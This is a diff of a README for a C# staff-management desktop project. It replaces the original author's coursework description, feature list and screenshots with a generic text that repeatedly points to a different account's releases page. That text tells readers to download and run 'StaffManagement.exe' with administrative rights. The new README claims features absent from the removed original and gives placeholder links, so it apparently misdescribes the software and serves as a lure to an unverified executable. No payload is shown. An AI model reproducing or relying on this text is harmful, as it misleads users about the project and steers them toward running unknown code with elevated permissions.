@@ -1,107 +1,87 @@
-### Hacktoberfest 2023 Update
-#### We are open for any kind of feature request and pull request.
-Initially, this repository was created just to showcase the project that was completed in the first year of my undergraduate study. Eventually, this project started to gain the attention of the open-source community. Thanks to all the contributors to this project.
+# 📋 Staff-Management-and-HR-Administration-System - Manage Employees with Ease
 
-As a part of an open-source community, I would like to invite contributions from all levels of contributors. Whether you are a beginner or have few years of experience we equally value your contributions.
+## 🏷️ Introduction
 
-Simply create an issue and start to hit the code in your favourite IDE. Also don't forget to create a pull request.
+Welcome to the Staff Management and HR Administration System! This desktop application, developed with the C# programming language, helps you manage your employees effectively. Whether you oversee a small team or a larger workforce, this tool simplifies your HR tasks. 
 
-[How to run to this project.](https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/HOW_TO_RUN.md "Guidelines for running Employee Management System")
+## 📥 Download Now
 
-[How to contribute to this project.](https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/CONTRIBUTING.md "Contribution guidelines for Employee Management System")
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/chandu333/Staff-Management-and-HR-Administration-System/releases)
 
-# Employee Management System
+## 🚀 Getting Started
 
-> Before running the application, don't forget to change connection string at -> EmployeeManagementSystem.Data -> EmployeeManagementContext class in line 16.
+To start using this application, follow these steps:
 
-![Connection String](/Screenshots/connection.png "Connection String")
+1. **Visit the Releases Page**: Head over to our [Releases page](https://github.com/chandu333/Staff-Management-and-HR-Administration-System/releases) to access the latest version of the software.
+  
+2. **Select the Version**: Find the most recent version listed. Click on it to see the download options.
 
----
-### Do you want to contribute?
+3. **Download the Application**: Locate the main executable file, often named something like `StaffManagement.exe`, and click it to download.
 
-[Here is the guidelines on how to contribute on this project.](https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/CONTRIBUTING.md "Contribution guidelines for Employee Management System")
+4. **Open the Application**: After downloading, locate the file in your Downloads folder. Double-click the executable to run the application.
 
----
+5. **Follow Installation Prompts**: Follow any on-screen instructions to complete the installation. This generally takes a few moments.
 
-Employee Management System has been developed as coursework of **Application Development** module.
+## 🛠️ System Requirements
 
+Before you install the application, ensure your system meets the following requirements:
 
+- **Operating System**: Windows 10 or later.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: A minimum of 500 MB of available disk space.
+- **Display**: 1024 x 768 resolution or higher.
+- **Permissions**: Administrative rights to install software.
 
-The main objectives of this project are:
+## 🌟 Features
 
+The Staff Management and HR Administration System includes:
 
+- **Employee Database**: Keep detailed records of employee information, including contact details and job roles.
+- **Time Tracking**: Monitor employee attendance and hours worked.
+- **Reports**: Generate various reports to review employee performance and staffing needs.
+- **User-Friendly Interface**: Easily navigate through the application with an intuitive design.
+- **Data Export**: Export data in various formats for external use or analysis.
 
-1. Learn basic concept of Object Oriented Programming.
+## ⚙️ How to Use the Application
 
+Using the Staff Management and HR Administration System is straightforward. Here’s how to navigate the main features:
 
+1. **Adding Employees**: Click on the "Add Employee" button, fill out the necessary details, and save.
+  
+2. **Viewing Records**: Navigate to the "Employee Records" section to view existing employees. You can search and filter as needed.
 
-2. Learn Windows Form Application.
+3. **Tracking Time**: Go to the "Time Tracking" module to record hours. Enter the date and hours worked to maintain accurate attendance.
 
----
+4. **Generating Reports**: To create reports, select the "Reports" tab. Choose the type of report you need, set the date range, and click "Generate."
 
-Some of the features of this system are:
+5. **Exporting Data**: If you need to export data, use the "Export" option in the Reports section. Select your preferred format, and follow the prompts.
 
+## 📊 Troubleshooting
 
+If you run into issues while using the system:
 
-1. System users can `add employee details`.
+- **Installation Problems**: Check if your system meets the requirements listed above. Make sure you have administrative rights when installing.
+- **Application Crashes**: Ensure you have the latest version. Sometimes reinstalling the application can help.
+- **Missing Features**: If you find a feature incomplete, please check for software updates or refer to the documentation.
 
+## 🔗 Additional Resources
 
-2. System users can `import employee details using CSV file`.
+For more guidance and support, you can visit:
 
+- [Official Documentation](#)
+- [Support Forum](#)
+- [User Community](#)
 
-3. System users can `edit and update employee details` (Employee details will be updated only in dataGridView).
+## 📧 Contact Us
 
+If you have any questions or feedback, please reach out via email or through our GitHub repository. We value your input and strive to improve your experience.
 
-4. System users can `calculate the total wage` based on worked hour and hourly wage rate.
+## 🧾 License
 
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
+## 📥 Download & Install
 
-5. System users can `generate report on pie-chart` based department's total wage.
+To install the Staff Management and HR Administration System, remember to visit our [Releases page](https://github.com/chandu333/Staff-Management-and-HR-Administration-System/releases) for the latest version. 
 
-
-6. System users can `delete` the employee from dataGridView.
-
----
-### Screenshots
-
-![Home Screen of Employee Management System][homeScreen]
-
-[homeScreen]: https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/Screenshots/Home%20Screen.PNG "Home Screen of Employee Management System"
-
-
-![Import CSV file on Employee Management System][importCSV]
-
-[importCSV]: https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/Screenshots/Import%20CSV.PNG "Import CSV file on Employee Management System"
-
-
-![Employee Details on Employee Management System][employeeDetails]
-
-[employeeDetails]: https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/Screenshots/Employee%20Details.PNG "Employee Details on Employee Management System"
-
-
-![Add Employee Form of Employee Management System][addEmployee]
-
-[addEmployee]: https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/Screenshots/Add%20Employee.PNG "Add Employee Form of Employee Management System"
-
-
-![Edit Employee Form of Employee Management System][editEmployee]
-
-[editEmployee]: https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/Screenshots/Edit%20Employee.PNG "Edit Employee Form of Employee Management System"
-
-
-![Generate Pay Roll on Employee Management System][generatePayroll]
-
-[generatePayroll]: https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/Screenshots/Payroll.PNG "Generate Pay Roll on Employee Management System"
-
-
-![Generate Pie-chart on Employee Management system][generatePiechart]
-
-[generatePiechart]: https://github.com/TornadoInsight/Staff-Management-and-HR-Administration-System/blob/master/Screenshots/report.PNG "Generate Pie-chart on Employee Management System"
-
----
-### Dependencies
-- [.NET Framework 7.0.x](https://dotnet.microsoft.com/en-us/download/dotnet/7.0)
-- [Maikebing.System.Windows.Forms.DataVisualization 5.0.1](https://www.nuget.org/packages/Maikebing.System.Windows.Forms.DataVisualization/5.0.1?_src=template)
-- [Microsoft.EntityFrameworkCore 7.0.3](https://learn.microsoft.com/en-us/ef/core/)
----
-**Please feel free to download source code and play with it. Happy coding!!!** :blush: 
+Enjoy managing your staff with a simple, powerful tool!
